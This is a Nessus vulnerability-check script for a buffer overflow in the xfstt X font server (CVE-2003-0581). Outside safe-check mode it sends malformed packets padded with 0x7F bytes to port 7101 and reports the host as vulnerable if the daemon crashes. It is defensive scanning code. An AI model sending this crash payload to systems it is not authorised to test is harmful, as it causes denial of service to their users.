#
#
# (C) Tenable Network Security
#
#
# Ref:
#  Date: Tue, 15 Jul 2003 00:38:20 +0200
#  From: ruben unteregger <ruben.unteregger@era-it.ch>
#  To: bugtraq@securityfocus.com
#  Subject: xfstt-1.4 vulnerability


if(description)
{
 script_id(11814);
 script_bugtraq_id(8182);
 script_version ("$Revision: 1.7 $");
 script_cve_id("CVE-2003-0581");
 
 name["english"] = "xfstt possible code execution";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote X Font Service for TrueType (xfstt) is vulnerable to a 
buffer overflow which may lead to code execution or a denial of service.

An attacker may use this flaw to gain root on this host remotely or
to prevent X11 from working properly

Solution : Upgrade to the latest version of xfstt
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes the remote xfstt daemon";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "Gain root remotely"; 

 script_family(english:family["english"]);
 script_require_ports(7101);
 exit(0);
}


include("misc_func.inc");

kb = known_service(port:7101);
if(kb && kb != "xfs")exit(0);


port = 7101;

if(safe_checks())
{
 if(get_port_state(port))
 {
  soc = open_sock_tcp(port);
  if(soc)
  { 
   close(soc);
   report = "
The remote X Font Service for TrueType (xfstt) might be vulnerable to a buffer
overflow which may lead to code execution or a denial of service.

An attacker may use this flaw to gain root on this host
remotely or prevent X11 from working properly.

*** Note that Nessus did not actually check for the flaw
*** so this might be a false positive

Solution : Upgrade to the latest version of xfstt
Risk factor : High";

   security_hole(port:port, data:report);
  }
 }
 exit(0);
}

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);
send(socket:soc, data:raw_string('l', 0, 11, 0, 6, 0, 0, 0));
r = recv(socket:soc, length:28);
if(!r)exit(0);
send(socket:soc, data:raw_string(17, 0, 8, 0) + raw_string(17) + crap(length:32, data:raw_string(0x00)));
r = recv(socket:soc, length:16);
if(strlen(r))
{
 close(soc);
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 send(socket:soc, data:raw_string('l', 0, 11, 0, 6, 0, 0, 0));

 r = recv(socket:soc, length:28);
 if(!r)exit(0);
 send(socket:soc, data:raw_string(17, 0, 8, 0) + raw_string(17) + crap(length:32, data:raw_string(0x7F)));
 r = recv(socket:soc, length:16);
 if(!r)security_hole(port);
}
